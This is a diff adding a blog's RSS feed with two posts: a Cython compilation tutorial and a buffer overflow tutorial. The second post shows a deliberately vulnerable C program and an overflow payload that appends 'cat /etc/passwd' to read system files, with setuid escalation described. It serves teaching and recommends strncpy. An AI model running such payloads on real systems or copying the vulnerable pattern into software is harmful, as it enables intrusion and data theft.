@@ -1,0 +1,390 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>#define</title>
+    <description>TODO: Write a description</description>
+    <link>http://0.0.0.0:4000/</link>
+    <atom:link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Sat, 26 Jul 2014 09:41:57 +0530</pubDate>
+    <lastBuildDate>Sat, 26 Jul 2014 09:41:57 +0530</lastBuildDate>
+    <generator>Jekyll v2.1.1</generator>
+    
+      <item>
+        <title>How to use Cython compiler??</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;There are two terms which could be interchangeably confused: &lt;em&gt;Cython&lt;/em&gt; and &lt;em&gt;CPython&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Cython&lt;/em&gt; is a compiled language which can be regarded as a superset of Python. The compiler translates the input
+Cython/Python code to a portable C code. Which in-turn could be compiled with a GCC compiler to get an executable.
+Cython helps to make a python program run faster. Whereas &lt;em&gt;CPython&lt;/em&gt; implies that its the C language implementation
+of python interpreter. There are other versions of python as well like Jython(Java implementation),
+IronPython(C# implementation) etc.&lt;/p&gt;
+
+&lt;p&gt;Say for example, let us consider a &lt;a href=&quot;https://www.gist.github.com/sdfsdfdsf&quot;&gt;sample program&lt;/a&gt;. Refer to the description
+given for more information.&lt;/p&gt;
+
+&lt;p&gt;When the sample.py is run, the running time is recored as given below:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;0.004858970642089844, 0.004592180252075195, 0.004554033279418945, 0.00444793701171875&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;For working with Cython initially we have to convert the python/Cython code into C language. It can be done using
+the Cython compiler.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cython --embed sample.py&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Output will be a C source file named sample.c&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;If the option &lt;code&gt;--embed[=&amp;lt;method_name&amp;gt;]&lt;/code&gt; is not given along with cython command, a main function is not included in
+the resulting code&lt;/p&gt;
+
+&lt;p&gt;After the compilation step, we have two ways to proceed:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Make a shared library and use it as a python extension module(used as a library).&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Make a binary file which could be executed a highier speed(if it has an input output style code)&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;make-a-module&quot;&gt;Make a module&lt;/h2&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc -shared -fPIC -Os -I /usr/include/python2.7 -o sample.so sample.c&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Note the use of .so extension for the output shared library. The file sample.so can be imported as a regular
+python module by the name sample. If a python program by the same name is present in the same directory, then
+the python file will only get imported.
+Recorded running time for module imported from shared library:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;0.015142202377319336, 0.014052867889404297, 0.012368202209472656, 0.01092982292175293&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Recorded running time for module imported from python script:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;0.00722503662109375, 0.00661015510559082, 0.006145954132080078, 0.0056989192962646484&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;make-an-executable&quot;&gt;Make an executable&lt;/h2&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc -I /usr/include/python2.7 -o sample sample.c -lpython2.7&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This is just a regular gcc compilation with the header file location mentioned using -I flag.&lt;/p&gt;
+
+&lt;p&gt;After compiling with cython and running the resultant C program, the recored times for five trials are as follows:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;0.002379894256591797, 0.0022690296173095703, 0.0022478103637695312, 0.002251863479614258&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The running time has doubled after running using the cython generated code.&lt;/p&gt;
+
+&lt;h1 id=&quot;gcc--shared--fpic--os--i-usrincludepython27--o-sampleso-samplec--lpython27--lpthread--lm--lutil--ldl&quot;&gt;$ gcc -shared -fPIC -Os -I /usr/include/python2.7 -o sample.so sample.c -lpython2.7 -lpthread -lm -lutil -ldl&lt;/h1&gt;
+
+&lt;p&gt;Other flags like -lpthread, -Os, -lm, -lutil, -ldl are all optional.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Command&lt;/th&gt;
+      &lt;th&gt; &lt;/th&gt;
+      &lt;th style=&quot;text-align: right&quot;&gt;Purpose&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-Os&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;Optimize size&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-I&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;Directories to check for header files&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-o&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;Final output&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-lpython2.7&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;Include python2.7 libraries&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-lpthread&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;Include pthread libraries&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-lm&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-lutil&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-ldl&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;All the library dependency can be seen using ldd command
+    $ ldd sample&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;  linux-vdso.so.1 (0x00007fff95ffe000)
+  libpython2.7.so.1.0 =&amp;gt; /usr/lib/libpython2.7.so.1.0 (0x00007f64805e4000)
+  libpthread.so.0 =&amp;gt; /usr/lib/libpthread.so.0 (0x00007f64803c6000)
+  libm.so.6 =so&amp;gt; /usr/lib/libm.so.6 (0x00007f64800c2000)
+  libutil.so.1 =&amp;gt; /usr/lib/libutil.so.1 (0x00007f647febf000)
+  libdl.so.2 =&amp;gt; /usr/lib/libdl.so.2 (0x00007f647febf000007f647fcbb000)
+  libc.so.6 =&amp;gt; /usr/lib/libc.so.6 (0x00007f647f90d000)
+  /lib64/ld-linux-x86-64.so.2 (0x00007f64809ad000)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;faq&quot;&gt;FAQ:&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;Quest: Why do I get this import error?
+       &quot;ImportError: ./sample.so: cannot dynamically load executable&quot;
+  Ans: You are trying to import a file which is not a shared library. Use -shared flag along with gcc
+
+Quest: What is the error init function not defined?
+       &quot;ImportError: dynamic module does not define init function (initsample_test)&quot;
+  Ans: Names of the files, ie the shared library and both input codes(C and python/cython) has to be
+       same with only the extensions changed. --------------------------------------------------------------------------------------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Interesting Links:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[Stackoverflow] - A stackoverflow question similar to our 
+Linux Man pages
+Cython help
+http://www.behnel.de/cython200910/talk.html
+http://www.cprogramming.com/tutorial/shared-libraries-linux-gcc.html
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&quot;todo&quot;&gt;TODO&lt;/h1&gt;
+&lt;p&gt;OK    &amp;gt; Difference between CPython and Cython
+OK    &amp;gt; Usage of sample executable(from above example) as modules
+OK    &amp;gt; How to make a C-Extension python module&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;gt; What is extended iterable unpacking??
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Sat, 26 Jul 2014 00:00:00 +0530</pubDate>
+        <link>http://0.0.0.0:4000/technology/python/2014/07/26/how-to-use-cython-compiler/</link>
+        <guid isPermaLink="true">http://0.0.0.0:4000/technology/python/2014/07/26/how-to-use-cython-compiler/</guid>
+        
+        <category>python</category>
+        
+        <category>cython</category>
+        
+        <category>compiler</category>
+        
+        
+        <category>technology</category>
+        
+        <category>python</category>
+        
+      </item>
+    
+      <item>
+        <title>Buffer Overflow Attack</title>
+        <description>&lt;p&gt;It has been very long since I have written something for the blog now,
+especially for the last post which I had mentioned that I would come back with
+a second part for it. Coming straight to the point, we have it here. :)&lt;/p&gt;
+
+&lt;p&gt;Just a recap of what we have talked about before on buffer over flow attacks: Any
+attack that exploits the point that the copying of a string to a buffer is not
+checked for size(string length) limit can be included in the Buffer Overflow attack
+catgory. &lt;/p&gt;
+
+&lt;p&gt;At first we will look at a simple demonstration for the buffer overflow attack.
+For this we should have a vulnarable program written. Without loss of
+generality we can use the below program for demonstration and if required
+further study because as the program size increases, just the complexity to
+find the limit for buffer overflowing increases, mostly all other factors
+remains same.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s   [[[[[%s]]]]]]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;What this program does:&lt;/p&gt;
+
+&lt;p&gt;Simply copies the first command line arguement to a character
+variable buf of size 500. At a later stage, the command list stored in the
+variable cmd is executed using the in-built function system.&lt;/p&gt;
+
+&lt;p&gt;Vulnarability:&lt;/p&gt;
+
+&lt;p&gt;The length of the command line arguement is not compared(checked) with
+the size of the destination variable - buf. The part of the input that
+overflows the buf array and gets overwritten into the cmd varible which
+in-turn gets executed automatically using the system function.
+If the final executable is a set-uid program, then the running
+process can automatically inherit the the permissions of the owner
+program. Say if the owner was root, the attacker gets superuser
+power.&lt;/p&gt;
+
+&lt;p&gt;What can be done:&lt;/p&gt;
+
+&lt;p&gt;Use strncpy instead of strcpy. Strncpy helps us to specify the lenght
+of sting that is to be copied to the final destination. On the other
+hand the default lenght for stcpy would the maximum string length.
+(Reffer MAN pages for strcpy and strncpy)&lt;/p&gt;
+
+&lt;p&gt;Below given is the input and output for various lengths of inputs(different
+lengths for the string AAAA…AAA):&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;BufferOverFlow&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;22:41&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./simple &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;python2.7 -c &lt;span class=&quot;s1&quot;&gt;&amp;#39;print &amp;quot;A&amp;quot; * 510&amp;#39;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
+&lt;span class=&quot;o&quot;&gt;[[[[[&lt;/span&gt;p�k�&lt;span class=&quot;o&quot;&gt;]]]]]]&lt;/span&gt;
+sh: &lt;span class=&quot;s1&quot;&gt;$&amp;#39;p\205k\206\377\177&amp;#39;&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
+
+
+BufferOverFlow&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;22:42&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./simple &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;python2.7 -c &lt;span class=&quot;s1&quot;&gt;&amp;#39;print &amp;quot;A&amp;quot; * 511&amp;#39;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
+&lt;span class=&quot;o&quot;&gt;[[[[[&lt;/span&gt;@�y&lt;span class=&quot;nv&quot;&gt;$]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]]]]]&lt;/span&gt;
+sh: @�y&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
+
+BufferOverFlow&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;22:41&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./simple &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;python2.7 -c &lt;span class=&quot;s1&quot;&gt;&amp;#39;print &amp;quot;A&amp;quot; * 512&amp;#39;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
+&lt;span class=&quot;o&quot;&gt;[[[[[]]]]]]&lt;/span&gt;
+
+BufferOverFlow&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;22:42&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./simple &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;python2.7 -c &lt;span class=&quot;s1&quot;&gt;&amp;#39;print &amp;quot;A&amp;quot; * 513&amp;#39;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
+&lt;span class=&quot;o&quot;&gt;[[[[[&lt;/span&gt;A&lt;span class=&quot;o&quot;&gt;]]]]]]&lt;/span&gt;
+sh: A: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
+
+BufferOverFlow&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;22:41&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./simple &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;python2.7 -c &lt;span class=&quot;s1&quot;&gt;&amp;#39;print &amp;quot;A&amp;quot; * 515&amp;#39;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
+&lt;span class=&quot;o&quot;&gt;[[[[[&lt;/span&gt;AAA&lt;span class=&quot;o&quot;&gt;]]]]]]&lt;/span&gt;
+sh: AAA: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This shows us that (for the above given program) when the input size becomes
+larger than or equal to 513(remember that the buffer length was 500charactors),
+the second variable, cmd starts to get overwritten by the excess or in our case
+the overflowed charactors from the input.
+Therefore a conclusion can be made that if the input string can be formatted in
+such a way that a valid bash command can be appended to the last of 512 random
+charactors, that will get executed .i.e., &lt;code&gt;python2.7 -c &#39;print &quot;A&quot; * 512 + &quot;&amp;lt;required command&amp;gt;&quot;&#39;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;If the input was &lt;code&gt;python2.7 -c &#39;print &quot;A&quot; * 512 + &quot;cat /etc/passwd&quot;&#39;&lt;/code&gt;, the
+attacker would be able to read the passwd file from the vulnarable machine.&lt;/p&gt;
+
+&lt;p&gt;NOTE:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;If space is to be used outside double or single quotes while giving input
+to the above program, remember to escape it using a backslash in the begining.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This attack can be extended easily:
+The statement terminating symol for bash script is a semi colon. So, therefor,
+by using a semi colon at the end of each statement to make a small script to be
+given as the input, could prove to be more dangerous.&lt;/p&gt;
+
+&lt;p&gt;IMPORTANT:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;“Do not use system() from a program with set-user-ID or set-group-ID privileges,
+because strange values for some environment variables might be used to subvert
+system integrity. Use the exec(3) family of functions instead, but not execlp(3)
+or execvp(3).  system() will not, in fact, work properly from programs with
+set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2,
+since bash 2 drops privileges on startup.  (Debian uses a modified bash which does
+not do this when invoked as sh.).” - Linux MAN Pages(SYSTEM(3))&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;“If the destination string of a strcpy() is not large enough, then anything might
+happen. Overflowing fixed-length string buffers is a favorite cracker technique for
+taking complete control of the machine. Any time a program reads or copies data into a
+buffer, the program first needs to check that there’s enough space. This may be unnecessary
+if  you  can  show that overflow is impossible, but be careful: programs can get changed
+over time, in ways that may make the impossible possible.” - Linux MAN Pages(STRCPY(3))&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Most programs written in C would have some parts of it using a strcpy function
+call. A BOF attack can be designed to exploit this vulnarable function. In the
+next level we would remove the system function call and inject the code through
+the input(instead of the command list for system function call)which would get
+executed in the stack.&lt;/p&gt;
+</description>
+        <pubDate>Fri, 25 Jul 2014 00:00:00 +0530</pubDate>
+        <link>http://0.0.0.0:4000/technology/2014/07/25/buffer-overflow-attack/</link>
+        <guid isPermaLink="true">http://0.0.0.0:4000/technology/2014/07/25/buffer-overflow-attack/</guid>
+        
+        <category>security</category>
+        
+        <category>bufferoverflow</category>
+        
+        <category>attack</category>
+        
+        <category>system</category>
+        
+        <category>strcpy</category>
+        
+        
+        <category>technology</category>
+        
+      </item>
+    
+  </channel>
+</rss>
